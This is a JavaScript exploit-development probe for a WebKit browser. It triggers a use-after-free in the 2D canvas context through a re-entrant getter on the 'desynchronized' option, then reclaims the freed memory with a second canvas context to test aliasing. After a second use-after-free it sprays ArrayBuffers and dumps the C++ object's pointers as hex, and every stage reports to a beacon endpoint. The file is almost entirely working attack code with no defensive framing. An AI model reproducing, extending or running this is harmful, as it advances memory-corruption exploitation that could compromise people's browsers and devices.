// PROBE P568v12: Context-reclaim aliasing — use a LIVE context to survive
//
// v11 confirmed: ALL C++ methods crash on zeroed ArrayBuffer spray.
// beginPath, createLinearGradient, getContextAttributes — all crash.
// Only webkitBackingStorePixelRatio survives (constant return 1).
//
// ROOT CAUSE: zeroed spray → null vtable, null m_canvas, null m_stateStack.
// Every C++ code path accesses at least one of these → null deref → crash.
//
// NEW APPROACH: Don't spray with ArrayBuffers. Instead, immediately after the
// UAF, create a SECOND CanvasRenderingContext2D on a new canvas. bmalloc should
// reclaim the just-freed 768B slot. Now inner aliases the new live context:
// its vtable, m_canvas, m_stateStack are all VALID. Methods should WORK.
//
// Verification: set globalAlpha on the second context, read through inner.
// If they match → confirmed aliasing → we have working methods on freed memory.

(() => {
  const L = window._p568log || function(){};
  const B = (tag, extra) => {
    const msg = 'P568v12-' + tag + (extra !== undefined ? '-' + extra : '');
    new Image().src = '/beacon/' + encodeURIComponent(msg) +
      '?t=' + performance.now().toFixed(0);
    L(msg);
  };

  B('BOOT');

  // === PHASE A: Trigger UAF ===
  let inner = null, outer = null;
  const canvas1 = document.createElement('canvas');
  canvas1.width = 300; canvas1.height = 150;
  document.body.appendChild(canvas1);

  const opts = {};
  Object.defineProperty(opts, 'desynchronized', {
    get() { inner = canvas1.getContext('2d'); return false; }
  });
  try { outer = canvas1.getContext('2d', opts); } catch(e) {
    B('UAF-ERR', e.name); return;
  }
  if (!inner || !outer || inner === outer) { B('UAF-FAIL'); return; }
  B('UAF-OK');

  // === PHASE B: Reclaim with a SECOND live context (NOT ArrayBuffer) ===
  // The freed 768B slot should be at the head of bmalloc's freelist.
  // The next 768B allocation should reclaim it.
  const canvas2 = document.createElement('canvas');
  canvas2.width = 200; canvas2.height = 100;
  document.body.appendChild(canvas2);
  const ctx2 = canvas2.getContext('2d');
  if (!ctx2) { B('CTX2-FAIL'); return; }
  B('CTX2-OK');

  // === PHASE C: Test if inner now aliases ctx2 ===
  // If inner's memory is now ctx2's C++ object, methods should work.

  // C1: Test globalAlpha (default = 1.0 on both)
  B('TRY-GA');
  let innerGA = null;
  try {
    innerGA = inner.globalAlpha;
    B('INNER-GA', '' + innerGA);
  } catch(e) {
    B('INNER-GA-ERR', e.name);
  }

  // C2: Set ctx2's globalAlpha to a distinctive value
  ctx2.globalAlpha = 0.777;
  B('CTX2-GA-SET', '0.777');

  // C3: Read inner's globalAlpha — if aliased, should read 0.777
  B('TRY-GA2');
  try {
    const ga2 = inner.globalAlpha;
    B('INNER-GA2', '' + ga2);
    if (Math.abs(ga2 - 0.777) < 0.001) {
      B('ALIAS-CONFIRMED');
    } else {
      B('NO-ALIAS', 'got=' + ga2);
    }
  } catch(e) {
    B('INNER-GA2-ERR', e.name);
  }

  // === PHASE D: If aliased, test more methods ===
  B('TRY-beginPath');
  try {
    inner.beginPath();
    B('OK-beginPath');
  } catch(e) { B('ERR-beginPath', e.name); }

  B('TRY-moveTo');
  try {
    inner.moveTo(10, 10);
    B('OK-moveTo');
  } catch(e) { B('ERR-moveTo', e.name); }

  B('TRY-lineTo');
  try {
    inner.lineTo(50, 50);
    B('OK-lineTo');
  } catch(e) { B('ERR-lineTo', e.name); }

  B('TRY-lineWidth-set');
  try {
    inner.lineWidth = 3.0;
    B('OK-lineWidth-set');
  } catch(e) { B('ERR-lineWidth-set', e.name); }

  B('TRY-lineWidth-get');
  try {
    const lw = inner.lineWidth;
    B('INNER-LW', '' + lw);
  } catch(e) { B('ERR-lineWidth-get', e.name); }

  // Check if ctx2's lineWidth changed (proving bidirectional aliasing)
  B('CTX2-LW', '' + ctx2.lineWidth);

  // === PHASE E: Test factory methods (return DOM objects) ===
  B('TRY-createLinearGradient');
  try {
    const g = inner.createLinearGradient(0, 0, 100, 100);
    B('OK-createLinearGradient', g ? g.constructor.name : '' + g);
  } catch(e) { B('ERR-createLinearGradient', e.name); }

  B('TRY-createImageData');
  try {
    const id = inner.createImageData(4, 4);
    B('OK-createImageData', id ? id.width + 'x' + id.height : '' + id);
  } catch(e) { B('ERR-createImageData', e.name); }

  B('TRY-getTransform');
  try {
    const t = inner.getTransform();
    B('OK-getTransform', t ? 'a=' + t.a : '' + t);
  } catch(e) { B('ERR-getTransform', e.name); }

  // === PHASE F: Test getContextAttributes ===
  B('TRY-GCA');
  try {
    const attrs = inner.getContextAttributes();
    if (attrs && typeof attrs === 'object') {
      const keys = Object.keys(attrs);
      B('OK-GCA', keys.length + ':' + keys.join(','));
      for (const k of keys) {
        B('GCA-' + k, '' + attrs[k]);
      }
    } else {
      B('OK-GCA', '' + attrs);
    }
  } catch(e) { B('ERR-GCA', e.name); }

  // === PHASE G: Drawing test — draw through inner, read through ctx2 ===
  B('TRY-DRAW');
  try {
    inner.fillStyle = 'red';
    inner.fillRect(0, 0, 50, 50);
    B('OK-DRAW');

    // Read pixels from canvas2 to verify the draw landed there
    const pixels = ctx2.getImageData(25, 25, 1, 1);
    const r = pixels.data[0], g = pixels.data[1], b = pixels.data[2], a = pixels.data[3];
    B('PIXEL', r + ',' + g + ',' + b + ',' + a);
    // Red fill should show r=255, g=0, b=0, a=255
  } catch(e) { B('ERR-DRAW', e.name); }

  // === PHASE H: Second UAF — free ctx2's slot, spray ArrayBuffers ===
  // This gives us raw byte access to the C++ object layout.
  B('UAF2-START');
  let inner2 = null, outer2 = null;
  const opts2 = {};
  Object.defineProperty(opts2, 'desynchronized', {
    get() { inner2 = canvas2.getContext('2d'); return false; }
  });
  try { outer2 = canvas2.getContext('2d', opts2); } catch(e) {
    B('UAF2-ERR', e.name); return;
  }
  if (!inner2 || !outer2 || inner2 === outer2) { B('UAF2-FAIL'); return; }
  B('UAF2-OK');
  // inner2 and inner both pointed to the freed C++ object of ctx2
  // (inner still points there, inner2 also points there)

  // Spray ArrayBuffers to reclaim the twice-freed slot
  const COUNT = 128;
  const SIZE = 768;
  const spray = [];
  for (let i = 0; i < COUNT; i++) spray.push(new ArrayBuffer(SIZE));
  B('SPRAY2', COUNT);

  // === PHASE I: Read the C++ object layout from spray buffers ===
  // Find which spray buffer has non-zero data (the one that reclaimed the slot)
  let overlapIdx = -1;
  for (let i = 0; i < COUNT; i++) {
    const u8 = new Uint8Array(spray[i]);
    let nonzero = 0;
    for (let j = 0; j < SIZE; j++) {
      if (u8[j] !== 0) { nonzero++; break; }
    }
    if (nonzero > 0) {
      overlapIdx = i;
      break;
    }
  }

  if (overlapIdx >= 0) {
    B('OVERLAP', overlapIdx);
    // Dump first 128 bytes as hex via BigUint64Array
    try {
      const u64 = new BigUint64Array(spray[overlapIdx]);
      const ptrs = [];
      for (let j = 0; j < 16; j++) {
        ptrs.push(u64[j].toString(16));
      }
      B('HEX-0', ptrs.slice(0, 8).join(','));
      B('HEX-64', ptrs.slice(8, 16).join(','));
    } catch(e) { B('HEX-ERR', e.name); }
  } else {
    B('NO-OVERLAP', 'all-zero');

    // Alternative: use webkitBackingStorePixelRatio on inner to confirm
    // reclaim still works, then write markers to find the buffer
    B('MARKER-SCAN');
    for (let i = 0; i < COUNT; i++) {
      // Write unique marker at offset 100 (unlikely to be a critical field)
      new Uint8Array(spray[i])[100] = i + 1;
    }
    // Check if webkitBackingStorePixelRatio still works on inner
    try {
      const val = inner.webkitBackingStorePixelRatio;
      B('WBSPR-AFTER', '' + val);
    } catch(e) { B('WBSPR-ERR', e.name); }
  }

  // === PHASE J: Outer contexts alive check ===
  B('OUTER-CHECK');
  try { B('OUTER1-GA', '' + outer.globalAlpha); } catch(e) { B('OUTER1-ERR', e.name); }
  try { B('OUTER2-GA', '' + outer2.globalAlpha); } catch(e) { B('OUTER2-ERR', e.name); }

  B('DONE');
})();
